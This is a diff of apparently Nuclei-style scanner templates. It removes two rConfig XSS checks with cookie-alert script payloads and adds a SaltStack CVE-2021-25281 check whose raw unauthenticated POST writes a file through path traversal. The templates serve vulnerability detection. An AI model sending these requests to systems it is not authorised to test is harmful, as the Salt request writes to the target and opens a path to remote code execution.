@@ -5201,88 +5201,6 @@
       ]
     },
     {
-      "id": "CVE-2020-12256",
-      "info": {
-        "author": "pikpikcu",
-        "name": "rConfig 3.9.4 XSS",
-        "reference": "https://nvd.nist.gov/vuln/detail/CVE-2020-12256",
-        "severity": "medium",
-        "tags": "cve,cve2020,rconfig,xss"
-      },
-      "requests": [
-        {
-          "matchers": [
-            {
-              "part": "body",
-              "type": "word",
-              "words": [
-                "<script>alert(document.cookie)</script>"
-              ]
-            },
-            {
-              "status": [
-                200
-              ],
-              "type": "status"
-            },
-            {
-              "part": "header",
-              "type": "word",
-              "words": [
-                "text/html"
-              ]
-            }
-          ],
-          "matchers-condition": "and",
-          "method": "GET",
-          "path": [
-            "{{BaseURL}}/devicemgmt.php?deviceId=%22%3E%3Cscript%3Ealert%28document.cookie%29%3C%2Fscript%3E"
-          ]
-        }
-      ]
-    },
-    {
-      "id": "CVE-2020-12259",
-      "info": {
-        "author": "pikpikcu",
-        "name": "rConfig 3.9.4 XSS",
-        "reference": "https://nvd.nist.gov/vuln/detail/CVE-2020-12259",
-        "severity": "medium",
-        "tags": "cve,cve2020,rconfig,xss"
-      },
-      "requests": [
-        {
-          "matchers": [
-            {
-              "part": "body",
-              "type": "word",
-              "words": [
-                "<script>alert(document.cookie)</script>"
-              ]
-            },
-            {
-              "status": [
-                200
-              ],
-              "type": "status"
-            },
-            {
-              "part": "header",
-              "type": "word",
-              "words": [
-                "text/html"
-              ]
-            }
-          ],
-          "matchers-condition": "and",
-          "method": "GET",
-          "path": [
-            "{{BaseURL}}/configDevice.php?rid=%22%3E%3Cscript%3Ealert%28document.cookie%29%3C%2Fscript%3E"
-          ]
-        }
-      ]
-    },
-    {
       "id": "CVE-2020-12720",
       "info": {
         "author": "pdnuclei - projectdiscovery.io",
@@ -8556,6 +8474,45 @@
             "{{BaseURL}}/www/delivery/lg.php?dest=http://example.com"
           ],
           "redirects": true
+        }
+      ]
+    },
+    {
+      "id": "CVE-2021-25281",
+      "info": {
+        "author": "madrobot",
+        "description": "The SaltAPI does not honor eauth credentials for the wheel_async client. Thus, an attacker can remotely run any wheel modules on the master.",
+        "name": "CVE-2021-25281 - SaltStack wheel_async unauth access",
+        "reference": "http://hackdig.com/02/hack-283902.htm",
+        "severity": "critical",
+        "tags": "cve,cve2021,saltapi,rce,saltstack"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "condition": "and",
+              "part": "body",
+              "type": "word",
+              "words": [
+                "return",
+                "tag",
+                "jid",
+                "salt",
+                "wheel"
+              ]
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "raw": [
+            "POST /run HTTP/1.1\nHost: {{Hostname}}\nAccept-Encoding: gzip, deflate\nAccept: */*\nAccept-Language: en\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0\nContent-Type: application/json\nContent-Length: 173\nConnection: close\n\n{\"client\":\"wheel_async\",\"fun\":\"pillar_roots.write\",\"data\":\"testing\",\"path\":\"../../../../../../../tmp/testing\",\"username\":\"1\",\"password\":\"1\",\"eauth\":\"pam\"}\n"
+          ]
         }
       ]
     },
